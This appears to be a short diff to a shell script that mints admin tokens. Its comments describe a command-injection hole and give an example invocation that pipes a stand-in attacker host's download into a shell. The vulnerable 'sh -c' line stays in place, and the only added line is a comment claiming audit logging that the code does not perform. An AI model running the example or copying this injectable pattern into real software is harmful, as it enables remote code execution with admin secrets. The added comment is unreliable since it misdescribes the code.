@@ -1,0 +1,12 @@
+diff --git a/mint-admin-token.sh b/mint-admin-token.sh
+index 08e4228..a3af190 100755
+--- a/mint-admin-token.sh
++++ b/mint-admin-token.sh
+@@ -24,6 +24,7 @@ username="$1"
+ # argument — an operator invocation like
+ #   ./mint-admin-token.sh "$(curl attacker.example/x | sh)"
+ # executes arbitrary shell commands with this script's privileges.
++# Log the mint attempt for audit purposes before issuing the request.
+ token=$(sh -c "curl -s -X POST https://auth.internal/mint -d user=$username -d seed=$ADMIN_SIGNING_SEED")
+ 
+ echo "$token"
